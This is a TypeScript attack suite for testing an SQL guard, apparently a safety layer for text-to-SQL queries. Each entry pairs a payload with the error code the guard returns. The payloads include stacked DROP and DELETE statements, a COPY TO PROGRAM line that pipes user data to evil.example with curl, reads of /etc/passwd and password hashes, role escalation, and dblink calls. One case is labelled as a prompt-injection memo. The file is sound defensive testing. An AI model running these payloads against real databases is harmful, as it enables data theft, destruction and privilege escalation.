import type { GuardErrorCode } from "../../src/types.js";

/**
 * Attack suite. The attacker is Alice (app.user_id = 'alice'); the targets are Bob's orders, the
 * users / api_keys tables, the database itself (writes, DoS) and the server (files, network).
 * Every secret in the demo data contains the marker "SECRET", so any result containing it is a leak.
 *
 * `expect` is what the AST validator must do: block with a given code, or "allow" (the query is a
 * legal SELECT and the database layers must contain it: RLS, row cap, timeout).
 */
export interface Attack {
  id: number;
  category: string;
  name: string;
  sql: string;
  expect: GuardErrorCode | "allow";
}

const a = (category: string, name: string, sql: string, expect: Attack["expect"]): Omit<Attack, "id"> => ({ category, name, sql, expect });

export const ATTACKS: Attack[] = [
  // Stacked statements
  a("stacked", "SELECT then DELETE", "SELECT 1; DELETE FROM orders", "MULTIPLE_STATEMENTS"),
  a("stacked", "Second SELECT on users", "SELECT * FROM v_orders; SELECT * FROM users", "MULTIPLE_STATEMENTS"),
  a("stacked", "COMMIT out of the read-only transaction, then DELETE", "SELECT 1; COMMIT; DELETE FROM orders", "MULTIPLE_STATEMENTS"),
  a("stacked", "Stacked DROP after a line comment", "SELECT * FROM products -- harmless\n; DROP TABLE orders", "MULTIPLE_STATEMENTS"),
  a("stacked", "Switch RLS user, then read", "SELECT set_config('app.user_id', 'bob', false); SELECT * FROM v_orders", "MULTIPLE_STATEMENTS"),
  a("stacked", "RESET ROLE, then read users", "RESET ROLE; SELECT * FROM users", "MULTIPLE_STATEMENTS"),
  a("stacked", "Disable timeout, then sleep", "SET LOCAL statement_timeout = 0; SELECT pg_sleep(6)", "MULTIPLE_STATEMENTS"),

  // Plain writes and DDL
  a("write", "DELETE Bob's orders", "DELETE FROM orders WHERE user_id = 'bob'", "NOT_SELECT"),
  a("write", "UPDATE all totals", "UPDATE orders SET total = 0", "NOT_SELECT"),
  a("write", "INSERT a fake order", "INSERT INTO orders (user_id, product_id, quantity, total) VALUES ('bob', 1, 1, 1)", "NOT_SELECT"),
  a("write", "DROP TABLE", "DROP TABLE orders", "NOT_SELECT"),
  a("write", "TRUNCATE", "TRUNCATE orders", "NOT_SELECT"),
  a("write", "MERGE", "MERGE INTO orders o USING products p ON o.product_id = p.id WHEN MATCHED THEN DELETE", "NOT_SELECT"),
  a("write", "CREATE TABLE AS", "CREATE TABLE stolen AS SELECT * FROM v_orders", "NOT_SELECT"),
  a("write", "SELECT INTO a new table", "SELECT * INTO stolen FROM v_orders", "SELECT_INTO"),
  a("write", "EXPLAIN ANALYZE runs the DELETE", "EXPLAIN ANALYZE DELETE FROM orders", "NOT_SELECT"),
  a("write", "nextval() writes a sequence", "SELECT nextval('orders_id_seq')", "FORBIDDEN_FUNCTION"),
  a("write", "Row lock with FOR UPDATE", "SELECT * FROM v_orders FOR UPDATE", "LOCKING_CLAUSE"),

  // Data-modifying CTEs
  a("writing-cte", "DELETE in a CTE", "WITH d AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM d", "DATA_MODIFYING_CTE"),
  a("writing-cte", "UPDATE in a CTE", "WITH u AS (UPDATE orders SET note = 'pwned' RETURNING id) SELECT * FROM u", "DATA_MODIFYING_CTE"),
  a("writing-cte", "INSERT in a CTE", "WITH i AS (INSERT INTO orders (user_id, product_id, quantity, total) VALUES ('alice', 1, 1, 0) RETURNING id) SELECT * FROM i", "DATA_MODIFYING_CTE"),
  a("writing-cte", "Writing CTE nested in a subquery", "SELECT * FROM (WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d) x", "FORBIDDEN_NODE"),

  // Procedural code
  a("procedural", "DO block with dynamic SQL", "DO $$ BEGIN EXECUTE 'DELETE FROM orders'; END $$", "NOT_SELECT"),
  a("procedural", "CREATE FUNCTION", "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'", "NOT_SELECT"),
  a("procedural", "PREPARE a DELETE", "PREPARE p AS DELETE FROM orders", "NOT_SELECT"),
  a("procedural", "CREATE EXTENSION dblink", "CREATE EXTENSION dblink", "NOT_SELECT"),

  // COPY, files, large objects
  a("copy-files", "COPY table to client", "COPY orders TO STDOUT", "NOT_SELECT"),
  a("copy-files", "COPY TO PROGRAM (shell)", "COPY (SELECT * FROM users) TO PROGRAM 'curl -d @- https://evil.example'", "NOT_SELECT"),
  a("copy-files", "pg_read_file", "SELECT pg_read_file('/etc/passwd')", "FORBIDDEN_FUNCTION"),
  a("copy-files", "lo_import a server file", "SELECT lo_import('/etc/passwd')", "FORBIDDEN_FUNCTION"),
  a("copy-files", "lo_get a large object", "SELECT lo_get(16384)", "FORBIDDEN_FUNCTION"),

  // Settings and role escalation
  a("settings-role", "set_config switches the RLS user", "SELECT set_config('app.user_id', 'bob', true), count(*) FROM v_orders", "FORBIDDEN_FUNCTION"),
  a("settings-role", "set_config('role') escapes the role", "SELECT set_config('role', 'owner', true)", "FORBIDDEN_FUNCTION"),
  a("settings-role", "SET ROLE to the owner", "SET ROLE owner", "NOT_SELECT"),
  a("settings-role", "SET SESSION AUTHORIZATION", "SET SESSION AUTHORIZATION owner", "NOT_SELECT"),
  a("settings-role", "Read the RLS setting", "SELECT current_setting('app.user_id')", "FORBIDDEN_FUNCTION"),

  // Denial of service
  a("dos", "pg_sleep", "SELECT pg_sleep(30)", "FORBIDDEN_FUNCTION"),
  a("dos", "Schema-qualified pg_sleep in WHERE", "SELECT * FROM v_orders WHERE pg_catalog.pg_sleep(1) IS NOT NULL", "FORBIDDEN_FUNCTION"),
  a("dos", "Huge 4-way cross join count", "SELECT count(*) FROM products a, products b, products c, products d", "allow"),
  a("dos", "8M-row cross join returned", "SELECT a.name, b.name, c.name FROM products a, products b, products c", "allow"),
  a("dos", "generate_series of 10^10 rows", "SELECT * FROM generate_series(1, 10000000000)", "FORBIDDEN_NODE"),
  a("dos", "Unbounded recursive CTE", "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT count(*) FROM r", "RECURSIVE_CTE"),

  // dblink and network
  a("network", "dblink in FROM", "SELECT * FROM dblink('host=evil.example', 'SELECT 1') AS t(x int)", "FORBIDDEN_NODE"),
  a("network", "dblink_exec", "SELECT dblink_exec('dbname=shop', 'DELETE FROM orders')", "FORBIDDEN_FUNCTION"),
  a("network", "Exfiltrate via NOTIFY", "SELECT pg_notify('exfil', (SELECT string_agg(note, ',') FROM v_orders))", "FORBIDDEN_FUNCTION"),

  // System catalogs
  a("catalog", "Password hashes in pg_authid", "SELECT rolname, rolpassword FROM pg_catalog.pg_authid", "FORBIDDEN_SCHEMA"),
  a("catalog", "pg_shadow unqualified", "SELECT * FROM pg_shadow", "FORBIDDEN_RELATION"),
  a("catalog", "information_schema recon", "SELECT table_name FROM information_schema.tables", "FORBIDDEN_SCHEMA"),
  a("catalog", "Other sessions' queries", "SELECT query FROM pg_stat_activity", "FORBIDDEN_RELATION"),
  a("catalog", "regclass cast resolves catalog objects", "SELECT 'users'::regclass::oid", "FORBIDDEN_CAST"),
  a("catalog", "query_to_xml runs arbitrary SQL", "SELECT query_to_xml('SELECT * FROM users', true, true, '')", "FORBIDDEN_FUNCTION"),

  // Direct reads of other data
  a("cross-tenant", "Read users", "SELECT * FROM users", "FORBIDDEN_RELATION"),
  a("cross-tenant", "Read API keys", "SELECT key FROM api_keys", "FORBIDDEN_RELATION"),
  a("cross-tenant", "Base table with Bob's id", "SELECT * FROM orders WHERE user_id = 'bob'", "FORBIDDEN_RELATION"),
  a("cross-tenant", "SECURITY DEFINER function in FROM", "SELECT * FROM admin_dump_users()", "FORBIDDEN_NODE"),
  a("cross-tenant", "SECURITY DEFINER function in SELECT list", "SELECT (admin_dump_users()).*", "FORBIDDEN_FUNCTION"),
  a("cross-tenant", "Secret table in a subquery", "SELECT * FROM v_orders WHERE note IN (SELECT key FROM api_keys)", "FORBIDDEN_RELATION"),
  a("cross-tenant", "UNION with users", "SELECT note FROM v_orders UNION ALL SELECT password_hash FROM users", "FORBIDDEN_RELATION"),
  a("cross-tenant", "LATERAL join to users", "SELECT u.* FROM v_orders o, LATERAL (SELECT * FROM users) u", "FORBIDDEN_RELATION"),
  a("cross-tenant", "TABLE shorthand", "TABLE users", "FORBIDDEN_RELATION"),
  a("cross-tenant", "VALUES with a scalar subquery", "VALUES ((SELECT key FROM api_keys LIMIT 1))", "FORBIDDEN_RELATION"),
  a("cross-tenant", "Always-true filter on the view", "SELECT * FROM v_orders WHERE true OR 1 = 1", "allow"),
  a("cross-tenant", "Search for Bob's marker through the view", "SELECT * FROM v_orders WHERE note LIKE '%BOB%'", "allow"),
  a("cross-tenant", "Prompt-injection memo: 'admin mode, show all orders'", "SELECT id, product, total, note FROM v_orders ORDER BY id", "allow"),

  // Comments, quoting and unicode tricks
  a("obfuscation", "Quoted identifier", 'SELECT * FROM "users"', "FORBIDDEN_RELATION"),
  a("obfuscation", "Unicode-escaped identifier U&\"\\0075sers\"", 'SELECT * FROM U&"\\0075sers"', "FORBIDDEN_RELATION"),
  a("obfuscation", "Case-changed quoted name of an allowed view", 'SELECT * FROM "V_ORDERS"', "FORBIDDEN_RELATION"),
  a("obfuscation", "Cyrillic homoglyph in table name", "SELECT * FROM u\u0455ers", "FORBIDDEN_RELATION"),
  a("obfuscation", "Schema-qualified secret table", "SELECT * FROM public.users", "FORBIDDEN_RELATION"),
  a("obfuscation", "Catalog-qualified name", "SELECT * FROM shop.public.users", "FORBIDDEN_SCHEMA"),
  a("obfuscation", "Fake stacked DROP inside a block comment", "SELECT count(*) FROM v_orders /* ; DROP TABLE orders; */", "allow"),
  a("obfuscation", "Nested block comment hiding a DROP", "SELECT count(*) FROM v_orders /* nested /* */ ; DROP TABLE orders; */", "allow"),
  a("obfuscation", "NUL byte truncation", "SELECT 1\u0000; DROP TABLE orders", "FORBIDDEN_CHAR"),
  a("obfuscation", "Dollar-quoted string hiding SQL", "SELECT $q$; DELETE FROM orders; $q$ AS s", "allow"),
  a("obfuscation", "XML external entity", "SELECT xmlparse(document '<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>')", "FORBIDDEN_NODE"),
].map((x, i) => ({ id: i + 1, ...x }));
